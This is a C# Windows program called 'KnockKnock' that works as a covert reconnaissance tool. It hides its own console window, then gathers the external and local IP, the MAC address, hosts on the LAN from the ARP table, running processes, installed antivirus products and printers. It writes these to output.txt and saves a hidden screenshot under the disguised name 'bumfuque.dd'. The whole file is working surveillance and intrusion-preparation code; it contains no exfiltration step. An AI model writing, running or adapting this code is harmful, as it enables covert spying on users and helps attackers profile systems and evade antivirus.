using System.Linq;
using System.IO;
using System;
using System.Text;
using System.Management;
using System.Net.NetworkInformation;
using System.Net;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Net.Sockets;
using System.Drawing.Printing;
using System.Diagnostics;
using System.Drawing;
using System.Windows.Forms;

namespace KnockKnock
{
    class Program
    {
        String foo = "\n###################################################\n";
        String[] output_array = new String[10000];
        int c = 0;

        static void Main(string[] args)
        {
            Program pg = new Program();

            pg.HideThisFuckingWindow();
            pg.GetNetworkInfo();
            pg.GetProcesses();
            pg.ListInstalledAntivirusProducts();
            pg.GetPrintersInfo();
            pg.addToFile(pg.output_array);
            pg.takeScreenShot();
            System.Environment.Exit(1);
        }

        #region Processes

        private void GetProcesses()
        {
            Process[] processlist = Process.GetProcesses();
            addToArray("\n########################PROCCC#####################\n");
            foreach (Process theprocess in processlist)
            {
                addToArray("\nName ---> [" + theprocess.ProcessName + "]" + " ID: " + theprocess.Id);
            }
            addToArray(foo);
        }

        #endregion

        #region Printers

        private void GetPrintersInfo()
        {
            addToArray("\n########################PRINTERS#####################\n");
            int i = 0;
            foreach (string printer in PrinterSettings.InstalledPrinters)
            {
                i++;
                addToArray("Printer " + i + " ---> " + printer);
            }

            addToArray("\n########################PRINTERS v2#####################\n");

            var printerQuery = new ManagementObjectSearcher("SELECT * from Win32_Printer");
            foreach (var printer in printerQuery.Get())
            {
                var name = printer.GetPropertyValue("Name");
                var status = printer.GetPropertyValue("Status");
                var isDefault = printer.GetPropertyValue("Default");
                var isNetworkPrinter = printer.GetPropertyValue("Network");

                addToArray("\nName -> " + name + "[Status --> " + status + "] , Default --> " + isDefault + "Network --> " + isNetworkPrinter);
                Console.WriteLine("{0} (Status: {1}, Default: {2}, Network: {3}",
                            name, status, isDefault, isNetworkPrinter);
            }
            addToArray(foo);
        }

        #endregion

        #region antivirus
        private void ListInstalledAntivirusProducts()
        {
            // prior to Windows Vista '\root\SecurityCenter'
            using (var searcher = new ManagementObjectSearcher(@"\\" +
                                                Environment.MachineName +
                                                @"\root\SecurityCenter",
                                                "SELECT * FROM AntivirusProduct"))
            {
                var searcherInstance = searcher.Get();
                foreach (var instance in searcherInstance)
                {
                    // Console.WriteLine(instance["displayName"].ToString());
                    addToArray(instance["displayName"].ToString());
                }
            }

            // for Windows Vista and above '\root\SecurityCenter2'
            using (var searcher = new ManagementObjectSearcher(@"\\" +
                                                Environment.MachineName +
                                                @"\root\SecurityCenter2",
                                                "SELECT * FROM AntivirusProduct"))
            {
                var searcherInstance = searcher.Get();
                foreach (var instance in searcherInstance)
                {
                    // Console.WriteLine(instance["displayName"].ToString());
                    addToArray(instance["displayName"].ToString());
                }
            }
        }
        #endregion

        #region screenshot

        private void takeScreenShot()
        {
            Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            using (Graphics g = Graphics.FromImage(bmp))
            {
                g.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size);
                bmp.Save("bumfuque.dd");  // saves the image
            }
        }

        #endregion


        #region output 
        private void addToArray(string line)
        {
            output_array[c] = line;
            c++;
        }

        private void addToFile(string[] str_array)
        {
            File.WriteAllLines("output.txt", str_array);
        }
        #endregion


        #region network

        public void GetNetworkInfo()
        {
            addToArray(foo);
            addToArray("\n##############NETWORK##################\n");
            //Get external ip
            addToArray("EXTERNAL IP: " + GetExternalIP());
            // Get PC IP address
            addToArray("PC IP ADRESS: " + GetIPAddress());
            // Get PC MAC address
            addToArray("PC MAC ADRESS: " + GetMacAddress());
            // Get all devices on network
            addToArray("\n##############HOSTS#####################\n");
            Dictionary<IPAddress, PhysicalAddress> all = GetAllDevicesOnLAN();
            foreach (KeyValuePair<IPAddress, PhysicalAddress> kvp in all)
            {
                addToArray("IP -> " + kvp.Key.ToString() + " Host -> " + GetHostName(kvp.Key.ToString() + " MAC -> " + kvp.Value.ToString()));
            }
            addToArray(foo);
        }
        private string GetExternalIP()
        {
            string externalip = new WebClient().DownloadString("http://checkip.dyndns.org");
            string[] a = externalip.Split(':');
            string a2 = a[1].Substring(1);
            string[] a3 = a2.Split('<');
            string a4 = a3[0];
            return a4;
        }
        public string GetHostName(string ipAddress)
        {
            try
            {
                IPHostEntry entry = Dns.GetHostEntry(ipAddress);
                if (entry != null)
                {
                    return entry.HostName;
                }
            }
            catch (SocketException ex)
            {
                return "Uknown Host";
            }
            return "Uknown Host";
        }
        [StructLayout(LayoutKind.Sequential)]
        struct MIB_IPNETROW
        {
            [MarshalAs(UnmanagedType.U4)]
            public int dwIndex;
            [MarshalAs(UnmanagedType.U4)]
            public int dwPhysAddrLen;
            [MarshalAs(UnmanagedType.U1)]
            public byte mac0;
            [MarshalAs(UnmanagedType.U1)]
            public byte mac1;
            [MarshalAs(UnmanagedType.U1)]
            public byte mac2;
            [MarshalAs(UnmanagedType.U1)]
            public byte mac3;
            [MarshalAs(UnmanagedType.U1)]
            public byte mac4;
            [MarshalAs(UnmanagedType.U1)]
            public byte mac5;
            [MarshalAs(UnmanagedType.U1)]
            public byte mac6;
            [MarshalAs(UnmanagedType.U1)]
            public byte mac7;
            [MarshalAs(UnmanagedType.U4)]
            public int dwAddr;
            [MarshalAs(UnmanagedType.U4)]
            public int dwType;
        }

        [DllImport("IpHlpApi.dll")]
        [return: MarshalAs(UnmanagedType.U4)]
        static extern int GetIpNetTable(IntPtr pIpNetTable,
              [MarshalAs(UnmanagedType.U4)] ref int pdwSize, bool bOrder);

        const int ERROR_INSUFFICIENT_BUFFER = 122;
        private static Dictionary<IPAddress, PhysicalAddress> GetAllDevicesOnLAN()
        {
            Dictionary<IPAddress, PhysicalAddress> all = new Dictionary<IPAddress, PhysicalAddress>();
            all.Add(GetIPAddress(), GetMacAddress());
            int spaceForNetTable = 0;
            GetIpNetTable(IntPtr.Zero, ref spaceForNetTable, false);
            IntPtr rawTable = IntPtr.Zero;
            try
            {
                rawTable = Marshal.AllocCoTaskMem(spaceForNetTable);
                int errorCode = GetIpNetTable(rawTable, ref spaceForNetTable, false);
                if (errorCode != 0)
                {
                    throw new Exception(string.Format(
                      "Unable to retrieve network table. Error code {0}", errorCode));
                }
                int rowsCount = Marshal.ReadInt32(rawTable);
                IntPtr currentBuffer = new IntPtr(rawTable.ToInt64() + Marshal.SizeOf(typeof(Int32)));
                MIB_IPNETROW[] rows = new MIB_IPNETROW[rowsCount];
                for (int index = 0; index < rowsCount; index++)
                {
                    rows[index] = (MIB_IPNETROW)Marshal.PtrToStructure(new IntPtr(currentBuffer.ToInt64() +
                                                (index * Marshal.SizeOf(typeof(MIB_IPNETROW)))
                                               ),
                                                typeof(MIB_IPNETROW));
                }
                PhysicalAddress virtualMAC = new PhysicalAddress(new byte[] { 0, 0, 0, 0, 0, 0 });
                PhysicalAddress broadcastMAC = new PhysicalAddress(new byte[] { 255, 255, 255, 255, 255, 255 });
                foreach (MIB_IPNETROW row in rows)
                {
                    IPAddress ip = new IPAddress(BitConverter.GetBytes(row.dwAddr));
                    byte[] rawMAC = new byte[] { row.mac0, row.mac1, row.mac2, row.mac3, row.mac4, row.mac5 };
                    PhysicalAddress pa = new PhysicalAddress(rawMAC);
                    if (!pa.Equals(virtualMAC) && !pa.Equals(broadcastMAC) && !IsMulticast(ip))
                    {
                        //Console.WriteLine("IP: {0}\t\tMAC: {1}", ip.ToString(), pa.ToString());
                        if (!all.ContainsKey(ip))
                        {
                            all.Add(ip, pa);
                        }
                    }
                }
            }
            finally
            {
                // Release the memory.
                Marshal.FreeCoTaskMem(rawTable);
            }
            return all;
        }

        private static IPAddress GetIPAddress()
        {
            String strHostName = Dns.GetHostName();
            IPHostEntry ipEntry = Dns.GetHostEntry(strHostName);
            IPAddress[] addr = ipEntry.AddressList;
            foreach (IPAddress ip in addr)
            {
                if (!ip.IsIPv6LinkLocal)
                {
                    return (ip);
                }
            }
            return addr.Length > 0 ? addr[0] : null;
        }

        private static PhysicalAddress GetMacAddress()
        {
            foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
            {
                // Only consider Ethernet network interfaces
                if (nic.NetworkInterfaceType == NetworkInterfaceType.Ethernet &&
                    nic.OperationalStatus == OperationalStatus.Up)
                {
                    return nic.GetPhysicalAddress();
                }
            }
            return null;
        }

        private static bool IsMulticast(IPAddress ip)
        {
            bool result = true;
            if (!ip.IsIPv6Multicast)
            {
                byte highIP = ip.GetAddressBytes()[0];
                if (highIP < 224 || highIP > 239)
                {
                    result = false;
                }
            }
            return result;
        }
        #endregion

        #region hide

        public void HideThisFuckingWindow()
        {
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);
        }

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;

        #endregion
    }
}
